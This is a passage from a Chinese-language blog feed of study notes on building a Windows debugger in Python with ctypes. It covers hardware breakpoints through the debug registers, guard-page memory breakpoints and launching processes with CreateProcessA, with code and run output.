the</span></span><br><span class="line">        <span class="comment"># free register that we found</span></span><br><span class="line">        <span class="keyword">if</span> available == <span class="number">0</span>:</span><br><span class="line">            context.Dr0 = address</span><br><span class="line">        <span class="keyword">elif</span> available == <span class="number">1</span>:</span><br><span class="line">            context.Dr1 = address</span><br><span class="line">        <span class="keyword">elif</span> available == <span class="number">2</span>:</span><br><span class="line">            context.Dr2 = address</span><br><span class="line">        <span class="keyword">elif</span> available == <span class="number">3</span>:</span><br><span class="line">            context.Dr3 = address</span><br><span class="line">        <span class="comment"># Set the breakpoint condition</span></span><br><span class="line">        context.Dr7 |= condition &lt;&lt; ((available * <span class="number">4</span>) + <span class="number">16</span>)</span><br><span class="line">        <span class="comment"># Set the length</span></span><br><span class="line">        context.Dr7 |= length &lt;&lt; ((available * <span class="number">4</span>) + <span class="number">18</span>)</span><br><span class="line">        <span class="comment"># Set this threads context with the debug registers</span></span><br><span class="line">        <span class="comment"># set</span></span><br><span class="line">        h_thread = self.open_thread(thread_id)</span><br><span class="line">        kernel32.SetThreadContext(h_thread,byref(context))</span><br><span class="line">    <span class="comment"># update the internal hardware breakpoint array at the used slot index.</span></span><br><span class="line">    self.hardware_breakpoints[available] = (address,length,condition)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exception_handler_single_step</span><span class="params">(self)</span>:</span></span><br><span class="line">    print(<span class="string">"[*] Exception address: 0x%08x"</span> % self.exception_address)</span><br><span class="line">    <span class="comment"># Comment from PyDbg:</span></span><br><span class="line">    <span class="comment"># determine if this single step event occured in reaction to a hardware breakpoint and grab the hit breakpoint.</span></span><br><span class="line">    <span class="comment"># according to the Intel docs, we should be able to check for the BS flag in Dr6. but it appears that windows</span></span><br><span class="line">    <span class="comment"># isn't properly propogating that flag down to us.</span></span><br><span class="line">    <span class="keyword">if</span> self.context.Dr6 &amp; <span class="number">0x1</span> <span class="keyword">and</span> (<span class="number">0</span> <span class="keyword">in</span> self.hardware_breakpoints):</span><br><span class="line">        slot = <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> self.context.Dr6 &amp; <span class="number">0x2</span> <span class="keyword">and</span> (<span class="number">1</span> <span class="keyword">in</span> self.hardware_breakpoints):</span><br><span class="line">        slot = <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> self.context.Dr6 &amp; <span class="number">0x4</span> <span class="keyword">and</span> (<span class="number">2</span> <span class="keyword">in</span> self.hardware_breakpoints):</span><br><span class="line">        slot = <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> self.context.Dr6 &amp; <span class="number">0x8</span> <span class="keyword">and</span> (<span class="number">3</span> <span class="keyword">in</span> self.hardware_breakpoints):</span><br><span class="line">        slot = <span class="number">3</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># This wasn't an INT1 generated by a hw breakpoint</span></span><br><span class="line">        continue_status = DBG_EXCEPTION_NOT_HANDLED</span><br><span class="line">    <span class="comment"># Now let's remove the breakpoint from the list</span></span><br><span class="line">    <span class="keyword">if</span> self.bp_del_hw(slot):</span><br><span class="line">        continue_status = DBG_CONTINUE</span><br><span class="line">    print(<span class="string">"[*] Hardware breakpoint removed."</span>)</span><br><span class="line">    <span class="keyword">return</span> continue_status</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bp_del_hw</span><span class="params">(self,slot)</span>:</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment"># Disable the breakpoint for all active threads</span></span><br><span class="line">    <span class="keyword">for</span> thread_id <span class="keyword">in</span> self.enumerate_threads():</span><br><span class="line">        context = self.get_thread_context(thread_id=thread_id)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Reset the flags to remove the breakpoint</span></span><br><span class="line">        context.Dr7 &amp;= ~(<span class="number">1</span> &lt;&lt; (slot * <span class="number">2</span>))</span><br><span class="line">        <span class="comment"># Zero out the address</span></span><br><span class="line">        <span class="keyword">if</span>   slot == <span class="number">0</span>: </span><br><span class="line">            context.Dr0 = <span class="number">0x00000000</span></span><br><span class="line">        <span class="keyword">elif</span> slot == <span class="number">1</span>: </span><br><span class="line">            context.Dr1 = <span class="number">0x00000000</span></span><br><span class="line">        <span class="keyword">elif</span> slot == <span class="number">2</span>: </span><br><span class="line">            context.Dr2 = <span class="number">0x00000000</span></span><br><span class="line">        <span class="keyword">elif</span> slot == <span class="number">3</span>: </span><br><span class="line">            context.Dr3 = <span class="number">0x00000000</span></span><br><span class="line">        <span class="comment"># Remove the condition flag</span></span><br><span class="line">        context.Dr7 &amp;= ~(<span class="number">3</span> &lt;&lt; ((slot * <span class="number">4</span>) + <span class="number">16</span>))</span><br><span class="line">        <span class="comment"># Remove the length flag</span></span><br><span class="line">        context.Dr7 &amp;= ~(<span class="number">3</span> &lt;&lt; ((slot * <span class="number">4</span>) + <span class="number">18</span>))</span><br><span class="line">        <span class="comment"># Reset the thread's context with the breakpoint removed</span></span><br><span class="line">        h_thread = self.open_thread(thread_id)</span><br><span class="line">        kernel32.SetThreadContext(h_thread,byref(context))</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># remove the breakpoint from the internal list.</span></span><br><span class="line">    <span class="keyword">del</span> self.hardware_breakpoints[slot]</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># my_test.py</span></span><br><span class="line"><span class="keyword">import</span> my_debugger</span><br><span class="line"><span class="keyword">from</span> my_debugger_defines <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debugger = my_debugger.debugger()</span><br><span class="line">pid = input(<span class="string">"Enter the PID of the process to attach to:"</span>)</span><br><span class="line">debugger.attach(int(pid))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里还是要使用bytes传参。</span></span><br><span class="line">printf_address = debugger.func_resolve(<span class="string">b"msvcrt.dll"</span>, <span class="string">b"printf"</span>)</span><br><span class="line">print(<span class="string">"[*] Address of printf: 0x%08x"</span> % printf_address)</span><br><span class="line"></span><br><span class="line">debugger.bp_set_hw(printf_address,<span class="number">1</span>,HW_EXECUTE)</span><br><span class="line"></span><br><span class="line">debugger.run()</span><br><span class="line"><span class="comment"># debugger.detach()</span></span><br><span class="line"><span class="comment"># input("")</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Enter the PID of the <span class="keyword">process</span> to attach to:<span class="number">6192</span></span><br><span class="line">[*] Address of printf: <span class="number">0</span>x765a4f70</span><br><span class="line">Event Code: <span class="number">3</span> Thread ID: <span class="number">24232</span></span><br><span class="line">Event Code: <span class="number">6</span> Thread ID: <span class="number">24232</span></span><br><span class="line">Event Code: <span class="number">2</span> Thread ID: <span class="number">20596</span></span><br><span class="line">Event Code: <span class="number">2</span> Thread ID: <span class="number">3520</span></span><br><span class="line">Event Code: <span class="number">2</span> Thread ID: <span class="number">24228</span></span><br><span class="line">Event Code: <span class="number">6</span> Thread ID: <span class="number">24232</span></span><br><span class="line">Event Code: <span class="number">6</span> Thread ID: <span class="number">24232</span></span><br><span class="line">Event Code: <span class="number">6</span> Thread ID: <span class="number">24232</span></span><br><span class="line">Event Code: <span class="number">6</span> Thread ID: <span class="number">24232</span></span><br><span class="line">Event Code: <span class="number">6</span> Thread ID: <span class="number">24232</span></span><br><span class="line">Event Code: <span class="number">6</span> Thread ID: <span class="number">24232</span></span><br><span class="line">Event Code: <span class="number">6</span> Thread ID: <span class="number">24232</span></span><br><span class="line">Event Code: <span class="number">2</span> Thread ID: <span class="number">22640</span></span><br><span class="line">Event Code: <span class="number">1</span> Thread ID: <span class="number">24232</span></span><br><span class="line">[*] Exception address: <span class="number">0</span>x765a4f70</span><br><span class="line">[*] Hardware breakpoint removed.</span><br><span class="line">Event Code: <span class="number">1</span> Thread ID: <span class="number">22640</span></span><br><span class="line">[*] Exception address: <span class="number">0</span>x77943f80</span><br><span class="line">[*] Hit the first breakpoint.</span><br><span class="line">Event Code: <span class="number">4</span> Thread ID: <span class="number">22640</span></span><br><span class="line">Event Code: <span class="number">4</span> Thread ID: <span class="number">20596</span></span><br><span class="line">Event Code: <span class="number">4</span> Thread ID: <span class="number">3520</span></span><br><span class="line">Event Code: <span class="number">4</span> Thread ID: <span class="number">24228</span></span><br></pre></td></tr></table></figure><hr><h3 id="内存断点"><a class="header-anchor" href="#内存断点"></a>内存断点</h3><p>内存断点设置流程如下：</p><p>首先查询一个内存块以并找到基地址（页面在虚拟内存中的起始地址）。一旦确定了页面大小，接着就设置页面权限，使其成为保护<code>（guard）</code>页。当CPU尝试访问这块内存时，就会抛出一个<code>GUARD_PAGE_EXCEPTION</code>异常。我们用对应的异常处理函数，将页面权限恢复到以前，最后让程序继续执行。</p><p>首先需要获取操作系统的内存页默认大小：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetSystemInfo</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSYSTEM_INFO lpSystemInfo</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_INFO</span> &#123;</span></span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">    DWORD dwOemId;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">      WORD wProcessorArchitecture;</span><br><span class="line">      WORD wReserved;</span><br><span class="line">    &#125; DUMMYSTRUCTNAME;</span><br><span class="line">  &#125; DUMMYUNIONNAME;</span><br><span class="line">  DWORD     dwPageSize;</span><br><span class="line">  LPVOID    lpMinimumApplicationAddress;</span><br><span class="line">  LPVOID    lpMaximumApplicationAddress;</span><br><span class="line">  DWORD_PTR dwActiveProcessorMask;</span><br><span class="line">  DWORD     dwNumberOfProcessors;</span><br><span class="line">  DWORD     dwProcessorType;</span><br><span class="line">  DWORD     dwAllocationGranularity;</span><br><span class="line">  WORD      wProcessorLevel;</span><br><span class="line">  WORD      wProcessorRevision;</span><br><span class="line">&#125; SYSTEM_INFO, *LPSYSTEM_INFO;</span><br></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/ns-sysinfoapi-system_info" target="_blank" rel="noopener">具体文档在这里</a></p><p>获取默认页面大小之后，接下来使用<code>VirtualQueryEx()</code>函数查询对应页面信息：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">SIZE_T <span class="title">VirtualQueryEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE                    hProcess,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCVOID                   lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">  PMEMORY_BASIC_INFORMATION lpBuffer,</span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T                    dwLength</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>其中：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MEMORY_BASIC_INFORMATION</span> &#123;</span></span><br><span class="line">  PVOID  BaseAddress;</span><br><span class="line">  PVOID  AllocationBase;</span><br><span class="line">  DWORD  AllocationProtect;</span><br><span class="line">  SIZE_T RegionSize;</span><br><span class="line">  DWORD  State;</span><br><span class="line">  DWORD  Protect;</span><br><span class="line">  DWORD  Type;</span><br><span class="line">&#125; MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;</span><br></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information" target="_blank" rel="noopener">具体文档在这里</a></p><p>其中<code>BaseAddress</code>参数的值就是我们目标页的开始地址，使用<code>VirtualProtectEx()</code>函数对这个地址设置保护权限即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">VirtualProtectEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hProcess,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  flNewProtect,</span></span></span><br><span class="line"><span class="function"><span class="params">  PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p><code>Debugger</code>实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bp_set_mem</span> <span class="params">(self, address, size)</span>:</span></span><br><span class="line">        </span><br><span class="line">    mbi = MEMORY_BASIC_INFORMATION()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Attempt to discover the base address of the memory page</span></span><br><span class="line">    <span class="keyword">if</span> kernel32.VirtualQueryEx(self.h_process, address, byref(mbi), sizeof(mbi)) &lt; sizeof(mbi):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    current_page = mbi.BaseAddress</span><br><span class="line"></span><br><span class="line">    <span class="comment"># We will set the permissions on all pages that are</span></span><br><span class="line">    <span class="comment"># affected by our memory breakpoint.</span></span><br><span class="line">    <span class="keyword">while</span> current_page &lt;= address + size:</span><br><span class="line">    </span><br><span class="line">        <span class="comment"># Add the page to the list, this will</span></span><br><span class="line">        <span class="comment"># differentiate our guarded pages from those</span></span><br><span class="line">        <span class="comment"># that were set by the OS or the debuggee process</span></span><br><span class="line">        self.guarded_pages.append(current_page)</span><br><span class="line">        </span><br><span class="line">        old_protection = c_ulong(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> kernel32.VirtualProtectEx(self.h_process, current_page, size, mbi.Protect | PAGE_GUARD, byref(old_protection)):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">     </span><br><span class="line">        <span class="comment"># Increase our range by the size of the</span></span><br><span class="line">        <span class="comment"># default system memory page size</span></span><br><span class="line">        current_page += self.page_size</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Add the memory breakpoint to our global list</span></span><br><span class="line">    self.memory_breakpoints[address] = (address, size, mbi)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_debug_event</span><span class="params">(self)</span>:</span></span><br><span class="line">        </span><br><span class="line">    debug_event    = DEBUG_EVENT()</span><br><span class="line">    continue_status = DBG_CONTINUE</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> kernel32.WaitForDebugEvent(byref(debug_event),<span class="number">100</span>):</span><br><span class="line">        <span class="comment"># grab various information with regards to the current exception.</span></span><br><span class="line">        self.h_thread          = self.open_thread(debug_event.dwThreadId)</span><br><span class="line">        self.context           = self.get_thread_context(h_thread=self.h_thread)</span><br><span class="line">        self.debug_event       = debug_event</span><br><span class="line">        </span><br><span class="line">                   </span><br><span class="line">        print(<span class="string">"Event Code: %d Thread ID: %d"</span> % \</span><br><span class="line">            (debug_event.dwDebugEventCode,debug_event.dwThreadId))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> debug_event.dwDebugEventCode == EXCEPTION_DEBUG_EVENT:</span><br><span class="line">            self.exception = debug_event.u.Exception.ExceptionRecord.ExceptionCode</span><br><span class="line">            self.exception_address = debug_event.u.Exception.ExceptionRecord.ExceptionAddress</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># call the internal handler for the exception event that just occured.</span></span><br><span class="line">            <span class="keyword">if</span> self.exception == EXCEPTION_ACCESS_VIOLATION:</span><br><span class="line">                print(<span class="string">"Access Violation Detected."</span>)</span><br><span class="line">            <span class="keyword">elif</span> self.exception == EXCEPTION_BREAKPOINT:</span><br><span class="line">                continue_status = self.exception_handler_breakpoint()</span><br><span class="line">            <span class="keyword">elif</span> self.exception == EXCEPTION_GUARD_PAGE:</span><br><span class="line">                print(<span class="string">"Guard Page Access Detected."</span>)</span><br><span class="line">            <span class="keyword">elif</span> self.exception == EXCEPTION_SINGLE_STEP:</span><br><span class="line">                self.exception_handler_single_step()</span><br><span class="line">            </span><br><span class="line">        kernel32.ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, continue_status)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># my_test.py</span></span><br><span class="line"><span class="keyword">import</span> my_debugger</span><br><span class="line"><span class="keyword">from</span> my_debugger_defines <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debugger = my_debugger.debugger()</span><br><span class="line">pid = input(<span class="string">"Enter the PID of the process to attach to:"</span>)</span><br><span class="line">debugger.attach(int(pid))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里还是要使用bytes传参。</span></span><br><span class="line">printf_address = debugger.func_resolve(<span class="string">b"msvcrt.dll"</span>, <span class="string">b"printf"</span>)</span><br><span class="line">print(<span class="string">"[*] Address of printf: 0x%08x"</span> % printf_address)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># debugger.bp_set_hw(printf_address,1,HW_EXECUTE)</span></span><br><span class="line">debugger.bp_set_mem(printf_address, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">debugger.run()</span><br><span class="line"><span class="comment"># debugger.detach()</span></span><br><span class="line"><span class="comment"># input("")</span></span><br></pre></td></tr></table></figure><p>运行效果：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Enter the PID of the <span class="keyword">process</span> to attach to:<span class="number">18932</span></span><br><span class="line">[*] Address of printf: <span class="number">0</span>x765a4f70</span><br><span class="line">Event Code: <span class="number">3</span> Thread ID: <span class="number">4304</span></span><br><span class="line">Event Code: <span class="number">6</span> Thread ID: <span class="number">4304</span></span><br><span class="line">Event Code: <span class="number">6</span> Thread ID: <span class="number">4304</span></span><br><span class="line">Event Code: <span class="number">6</span> Thread ID: <span class="number">4304</span></span><br><span class="line">Event Code: <span class="number">2</span> Thread ID: <span class="number">11536</span></span><br><span class="line">Event Code: <span class="number">1</span> Thread ID: <span class="number">11536</span></span><br><span class="line">[*] Exception address: <span class="number">0</span>x77943f80</span><br><span class="line">[*] Hit the first breakpoint.</span><br><span class="line">Event Code: <span class="number">4</span> Thread ID: <span class="number">11536</span></span><br><span class="line">Event Code: <span class="number">1</span> Thread ID: <span class="number">4304</span></span><br><span class="line">Guard Page Access Detected.</span><br><span class="line">Event Code: <span class="number">2</span> Thread ID: <span class="number">25076</span></span><br></pre></td></tr></table></figure><p>可见内存断点触发成功。</p><p>这里没有移除对内存的保护，但是程序也可以继续执行，是因为当CPU访问被保护的页面时，系统会抛出<code>GUARD_PAGE_EXCEPTION</code>异常，然后系统会自动将保护移除。</p><p>所以我们以后要处理内存断点的时候，只需要捕获<code>GUARD_PAGE_EXCEPTION</code>异常，并进行相应的处理就行了。</p><p>至此调试器的部分就基本理清了，可以基于本文中实现的调试功能，进一步组合处理，实现一些自动化分析过程。<code>p52</code></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 调试器 </tag>
            
            <tag> ctypes </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctypes学习笔记二——用python写一个调试器</title>
      <link href="/p/91668363.html"/>
      <url>/p/91668363.html</url>
      
        <content type="html"><![CDATA[<h1>ctypes学习笔记二</h1><h2 id="p-align-right-——用python写一个调试器-p"><a class="header-anchor" href="#p-align-right-——用python写一个调试器-p"></a><p align="right">——用python写一个调试器</p></h2><h3 id="ctypes创建进程："><a class="header-anchor" href="#ctypes创建进程："></a>ctypes创建进程：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> my_debugger</span><br><span class="line"></span><br><span class="line">debugger = my_debugger.debugger()</span><br><span class="line">debugger.load(<span class="string">b"./01-ErrorShow.exe"</span>)  <span class="comment"># 这里也要传递bytes</span></span><br></pre></td></tr></table></figure><p>主要是调用了<code>kernel32.CreateProcessA</code>这个API函数：</p><p>该函数定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateProcessA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR                lpApplicationName,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSTR                 lpCommandLine,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL                  bInheritHandles,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                 dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID                lpEnvironment,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR                lpCurrentDirectory,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSTARTUPINFOA        lpStartupInfo,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa" target="_blank" rel="noopener">具体文档在这里</a></p><a id="more"></a><p>调用代码太长，这里只贴主要部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(self,path_to_exe)</span>:</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment"># dwCreation flag determines how to create the process</span></span><br><span class="line">    <span class="comment"># set creation_flags = CREATE_NEW_CONSOLE if you want</span></span><br><span class="line">    <span class="comment"># to see the calculator GUI</span></span><br><span class="line">    creation_flags = DEBUG_PROCESS</span><br><span class="line"></span><br><span class="line">    <span class="comment"># instantiate the structs</span></span><br><span class="line">    startupinfo         = STARTUPINFO()</span><br><span class="line">    process_information = PROCESS_INFORMATION()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># The following two options allow the started process</span></span><br><span class="line">    <span class="comment"># to be shown as a separate window. This also illustrates</span></span><br><span class="line">    <span class="comment"># how different settings in the STARTUPINFO struct can affect</span></span><br><span class="line">    <span class="comment"># the debuggee.</span></span><br><span class="line">    startupinfo.dwFlags     = <span class="number">0x1</span></span><br><span class="line">    startupinfo.wShowWindow = <span class="number">0x0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># We then initialize the cb variable in the STARTUPINFO struct</span></span><br><span class="line">    <span class="comment"># which is just the size of the struct itself</span></span><br><span class="line">    startupinfo.cb = sizeof(startupinfo)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> kernel32.CreateProcessA(path_to_exe,</span><br><span class="line">                               <span class="literal">None</span>,</span><br><span class="line">                               <span class="literal">None</span>,</span><br><span class="line">                               <span class="literal">None</span>,</span><br><span class="line">                               <span class="literal">None</span>,</span><br><span class="line">                               creation_flags,</span><br><span class="line">                               <span class="literal">None</span>,</span><br><span class="line">                               <span class="literal">None</span>,</span><br><span class="line">                               byref(startupinfo),</span><br><span class="line">                               byref(process_information)):</span><br><span class="line">        </span><br><span class="line">        print(<span class="string">"[*] We have successfully launched the process!"</span>)</span><br><span class="line">        print(<span class="string">"[*] The Process ID I have is: %d"</span> % \</span><br><span class="line">                     process_information.dwProcessId)</span><br><span class="line">    <span class="keyword">else</span>:    </span><br><span class="line">        print(<span class="string">"[*] Error with error code %d."</span> % kernel32.GetLastError())</span><br></pre></td></tr></table></figure><p>调用成功会打印出进程的<code>PID</code>:</p><figure class="highlight powershell"><table><tr><td 